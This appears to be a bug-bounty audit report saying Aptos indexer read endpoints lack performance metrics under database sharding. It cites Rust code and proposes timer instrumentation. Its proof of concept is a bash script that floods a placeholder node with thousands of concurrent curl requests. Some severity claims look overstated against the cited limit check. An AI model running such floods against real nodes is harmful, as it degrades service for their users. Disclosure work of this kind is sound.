# Audit Report

## Title
Unmonitored Indexer Read Operations Enable Stealthy Resource Exhaustion Attacks

## Summary
Critical indexer read operations exposed through public REST API endpoints are not instrumented with performance metrics when database sharding is enabled, creating a monitoring blind spot that attackers can exploit to perform resource exhaustion attacks without detection.

## Finding Description

The indexer's `TIMER` metric only instruments two operations: [1](#0-0) 

However, multiple critical read operations in the indexer are completely uninstrumented:

1. **`get_account_ordered_transactions`** - Exposed via `/accounts/:address/transactions` REST endpoint [2](#0-1) 

2. **`get_events_by_event_key`** - Exposed via event query endpoints [3](#0-2) 

3. **`lookup_events_by_key`** - Internal index lookup operation [4](#0-3) 

When database sharding is enabled, the API routes these queries through the indexer: [5](#0-4) 

The critical issue is that while AptosDB reader operations use the `gauged_api` wrapper for instrumentation [6](#0-5) , the indexer read path has **no equivalent instrumentation**.

**Attack Scenario:**
1. Attacker identifies nodes with `db_sharding_enabled` 
2. Attacker sends high-volume queries to indexer-backed endpoints:
   - `/accounts/:address/transactions` with maximum `limit` values
   - Event queries with broad ranges and high pagination
3. These queries consume significant CPU, I/O, and memory iterating through database indices
4. No indexer-level metrics expose which operations are causing load
5. Operators see overall node degradation but cannot identify root cause
6. Attacker sustains attack to cause persistent API unavailability

The only metrics available are low-level schemadb operations that use column family names, not operation types, making diagnosis impossible.

## Impact Explanation

This is a **Medium Severity** vulnerability per Aptos bug bounty criteria:

- **Resource Exhaustion**: Attackers can exhaust node resources (CPU, I/O, memory) through expensive queries
- **API Availability Impact**: Sustained attacks degrade or disable API functionality for all users  
- **Operational Blind Spot**: Operators cannot identify the attack vector or implement targeted mitigations
- **No Direct Fund Loss**: Does not affect consensus safety or directly steal/freeze funds
- **State Consistency**: Does not corrupt state, only affects read availability

This aligns with "Validator node slowdowns" and creates operational challenges requiring intervention.

## Likelihood Explanation

**Likelihood: High**

- **No Authentication Required**: Public REST API endpoints accessible without privileges
- **Low Attack Complexity**: Simple HTTP GET requests with large pagination parameters
- **Easy to Automate**: Trivial to script and sustain
- **Configuration Dependent**: Only affects nodes with `db_sharding_enabled`, but this is the recommended production configuration for performance
- **No Rate Limiting Context**: Without metrics, operators cannot implement effective per-operation rate limits

## Recommendation

Add indexer-level instrumentation for all read operations:

```rust
// In storage/indexer/src/db_indexer.rs

pub fn get_account_ordered_transactions(
    &self,
    address: AccountAddress,
    start_seq_num: u64,
    limit: u64,
    include_events: bool,
    ledger_version: Version,
) -> Result<AccountOrderedTransactionsWithProof> {
    let _timer = TIMER.timer_with(&["get_account_ordered_transactions"]);
    // ... existing implementation
}

pub fn get_events_by_event_key(
    &self,
    event_key: &EventKey,
    start_seq_num: u64,
    order: Order,
    limit: u64,
    ledger_version: Version,
) -> Result<Vec<EventWithVersion>> {
    let _timer = TIMER.timer_with(&["get_events_by_event_key"]);
    // ... existing implementation
}

pub fn lookup_events_by_key(
    &self,
    event_key: &EventKey,
    start_seq_num: u64,
    limit: u64,
    ledger_version: u64,
) -> Result<Vec<(u64, Version, u64)>> {
    let _timer = TIMER.timer_with(&["lookup_events_by_key"]);
    // ... existing implementation
}
```

Alternatively, implement a `gauged_indexer_api` wrapper similar to `gauged_api` used in AptosDB.

## Proof of Concept

```bash
#!/bin/bash
# Attack script demonstrating resource exhaustion

NODE_URL="http://target-node:8080"
VICTIM_ADDRESS="0x1"

# Flood with expensive account transaction queries
for i in {1..1000}; do
  curl -s "${NODE_URL}/v1/accounts/${VICTIM_ADDRESS}/transactions?limit=10000&start=0" &
done

# Flood with expensive event queries  
EVENT_KEY="0x0000000000000000000000000000000000000000000000000000000000000001::coin::CoinStore<0x1::aptos_coin::AptosCoin>/withdraw_events"
for i in {1..1000}; do
  curl -s "${NODE_URL}/v1/accounts/${VICTIM_ADDRESS}/events/${EVENT_KEY}?limit=10000" &
done

# Monitor node metrics - observe that:
# 1. Overall node CPU/memory increases
# 2. No indexer-level operation metrics show the attack
# 3. Only low-level schemadb cf_name metrics increment (unhelpful for diagnosis)
```

The attack succeeds because operators monitoring `aptos_internal_indexer_timer_seconds` will only see metrics for `process_a_batch` and `translate_event_v2_to_v1`, not the read operations being abused.

## Notes

The vulnerability specifically affects production deployments using database sharding for performance optimization. While lower-level schemadb metrics exist, they use column family names rather than operation types, making it impossible to identify which indexer operations are being abused. This monitoring gap violates the Resource Limits invariant by preventing operators from detecting and mitigating resource exhaustion attacks targeting specific operations.

### Citations

**File:** storage/indexer/src/metrics.rs (L7-15)
```rust
pub static TIMER: Lazy<HistogramVec> = Lazy::new(|| {
    register_histogram_vec!(
        "aptos_internal_indexer_timer_seconds",
        "Various timers for performance analysis.",
        &["name"],
        exponential_buckets(/*start=*/ 1e-9, /*factor=*/ 2.0, /*count=*/ 32).unwrap(),
    )
    .unwrap()
});
```

**File:** storage/indexer/src/db_indexer.rs (L209-245)
```rust
    pub fn lookup_events_by_key(
        &self,
        event_key: &EventKey,
        start_seq_num: u64,
        limit: u64,
        ledger_version: u64,
    ) -> Result<
        Vec<(
            u64,     // sequence number
            Version, // transaction version it belongs to
            u64,     // index among events for the same transaction
        )>,
    > {
        let mut iter = self.db.iter::<EventByKeySchema>()?;
        iter.seek(&(*event_key, start_seq_num))?;

        let mut result = Vec::new();
        let mut cur_seq = start_seq_num;
        for res in iter.take(limit as usize) {
            let ((path, seq), (ver, idx)) = res?;
            if path != *event_key || ver > ledger_version {
                break;
            }
            if seq != cur_seq {
                let msg = if cur_seq == start_seq_num {
                    "First requested event is probably pruned."
                } else {
                    "DB corruption: Sequence number not continuous."
                };
                bail!("{} expected: {}, actual: {}", msg, cur_seq, seq);
            }
            result.push((seq, ver, idx));
            cur_seq += 1;
        }

        Ok(result)
    }
```

**File:** storage/indexer/src/db_indexer.rs (L586-612)
```rust
    pub fn get_account_ordered_transactions(
        &self,
        address: AccountAddress,
        start_seq_num: u64,
        limit: u64,
        include_events: bool,
        ledger_version: Version,
    ) -> Result<AccountOrderedTransactionsWithProof> {
        self.indexer_db
            .ensure_cover_ledger_version(ledger_version)?;
        error_if_too_many_requested(limit, MAX_REQUEST_LIMIT)?;

        let txns_with_proofs = self
            .indexer_db
            .get_account_ordered_transactions_iter(address, start_seq_num, limit, ledger_version)?
            .map(|result| {
                let (_seq_num, txn_version) = result?;
                self.main_db_reader.get_transaction_by_version(
                    txn_version,
                    ledger_version,
                    include_events,
                )
            })
            .collect::<Result<Vec<_>>>()?;

        Ok(AccountOrderedTransactionsWithProof::new(txns_with_proofs))
    }
```

**File:** storage/indexer/src/db_indexer.rs (L644-650)
```rust
    pub fn get_events_by_event_key(
        &self,
        event_key: &EventKey,
        start_seq_num: u64,
        order: Order,
        limit: u64,
        ledger_version: Version,
```

**File:** api/src/context.rs (L900-923)
```rust
        let txns_res = if !db_sharding_enabled(&self.node_config) {
            self.db.get_account_ordered_transactions(
                address,
                start_seq_number,
                limit as u64,
                true,
                ledger_version,
            )
        } else {
            self.indexer_reader
                .as_ref()
                .ok_or_else(|| anyhow!("Indexer reader is None"))
                .map_err(|err| {
                    E::internal_with_code(err, AptosErrorCode::InternalError, ledger_info)
                })?
                .get_account_ordered_transactions(
                    address,
                    start_seq_number,
                    limit as u64,
                    true,
                    ledger_version,
                )
                .map_err(|e| AptosDbError::Other(e.to_string()))
        };
```

**File:** storage/aptosdb/src/db/aptosdb_internal.rs (L439-463)
```rust
    if nested {
        api_impl()
    } else {
        let _guard = CONCURRENCY_GAUGE.concurrency_with(&[api_name]);

        let timer = Instant::now();

        let res = api_impl();

        let res_type = match &res {
            Ok(_) => "Ok",
            Err(e) => {
                warn!(
                    api_name = api_name,
                    error = ?e,
                    "AptosDB API returned error."
                );
                "Err"
            },
        };
        API_LATENCY_SECONDS.observe_with(&[api_name, res_type], timer.elapsed().as_secs_f64());
        ENTERED_GAUGED_API.with(|entered| entered.set(false));

        res
    }
```
